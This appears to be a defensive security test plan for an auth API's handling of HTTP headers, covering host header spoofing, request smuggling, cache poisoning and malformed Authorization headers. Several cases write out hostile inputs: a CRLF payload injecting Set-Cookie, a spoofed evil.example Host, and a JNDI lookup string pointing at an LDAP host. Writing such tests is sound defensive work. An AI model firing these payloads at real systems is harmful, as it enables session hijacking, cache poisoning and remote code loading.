# TC-SEC-HEADERS-HOST — Header injection, host header attacks, smuggling

## TC-SEC-HEAD-001 — Host header `evil.example` on /auth/login
- **Steps:** POST with `Host: evil.example`.
- **Expected:** Cloudflare tunnel routes by Host; non-matching Host → 530/404 from edge. If reaches API: API does not consult Host. Document.
- **Severity:** medium

## TC-SEC-HEAD-002 — Host header injection in /auth/forgot-password
- **Pre:** Per CLAUDE.md the FRONTEND_URL is read from env, not Host. Verify reset URL never uses request Host.
- **Severity:** smoke

## TC-SEC-HEAD-003 — Multiple Host headers concatenated
- **Severity:** medium

## TC-SEC-HEAD-004 — Header Smuggling: TE: chunked + CL conflict
- **Steps:** Craft request with both Transfer-Encoding and Content-Length.
- **Expected:** 400 from front-end (Cloudflare).
- **Severity:** high

## TC-SEC-HEAD-005 — HTTP/2 frame smuggling test
- **Severity:** high

## TC-SEC-HEAD-006 — CRLF in custom header value
- **Steps:** `X-Custom: foo\r\nSet-Cookie: hacked=1`.
- **Expected:** Rejected by Node http parser.
- **Severity:** high

## TC-SEC-HEAD-007 — CRLF in URL query string `?x=foo%0d%0aSet-Cookie:`
- **Severity:** high

## TC-SEC-HEAD-008 — Path with control chars `%00` `%0a`
- **Severity:** medium

## TC-SEC-HEAD-009 — Method override `X-HTTP-Method-Override` ignored
- **Severity:** medium

## TC-SEC-HEAD-010 — `X-Original-URL` ignored
- **Severity:** medium

## TC-SEC-HEAD-011 — `X-Rewrite-URL` ignored
- **Severity:** medium

## TC-SEC-HEAD-012 — `Forwarded` header poison: `Forwarded: for=evil`
- **Severity:** medium

## TC-SEC-HEAD-013 — Connection: close blank line smuggling
- **Severity:** high

## TC-SEC-HEAD-014 — Trailers ignored
- **Severity:** low

## TC-SEC-HEAD-015 — Long header (16 KB)
- **Steps:** Single header value 16 KB.
- **Expected:** 431 / 400.
- **Severity:** medium

## TC-SEC-HEAD-016 — Many headers (1000)
- **Severity:** medium

## TC-SEC-HEAD-017 — Duplicate Authorization: pick deterministic
- **Severity:** edge

## TC-SEC-HEAD-018 — Authorization header injected via cookie? (not honoured)
- **Severity:** medium

## TC-SEC-HEAD-019 — Bypass via `_method` query param ignored
- **Severity:** medium

## TC-SEC-HEAD-020 — Empty Authorization header `Authorization:`
- **Severity:** smoke

## TC-SEC-HEAD-021 — Authorization header with extra spaces `Bearer    <tok>`
- **Steps:** Multi-space.
- **Expected:** 401 because slice(7) yields `   <tok>` and verify fails.
- **Severity:** medium

## TC-SEC-HEAD-022 — Authorization header with tab characters
- **Severity:** edge

## TC-SEC-HEAD-023 — Header `Range:` on auth endpoints ignored
- **Severity:** low

## TC-SEC-HEAD-024 — Cache poisoning via `X-Forwarded-Host`
- **Severity:** high

## TC-SEC-HEAD-025 — Cache poisoning via `X-Forwarded-Proto: http`
- **Severity:** medium

## TC-SEC-HEAD-026 — Origin header tampering bypass: spoofed origin matches allow-list?
- **Steps:** Send `Origin: https://staging.doable.me` from any client.
- **Expected:** Browser-only enforcement; server uses CORS for cross-origin XHR. Document.
- **Severity:** medium

## TC-SEC-HEAD-027 — Cookie smuggling via `Cookie: a=b; c=evil`
- **Severity:** medium

## TC-SEC-HEAD-028 — Compression bomb (deeply nested)
- **Severity:** medium

## TC-SEC-HEAD-029 — User-Agent containing log4j-like JNDI string
- **Steps:** UA `${jndi:ldap://x}`.
- **Expected:** No log4j in this stack; safe by default.
- **Severity:** low

## TC-SEC-HEAD-030 — Path with overlong UTF-8 sequence
- **Severity:** edge
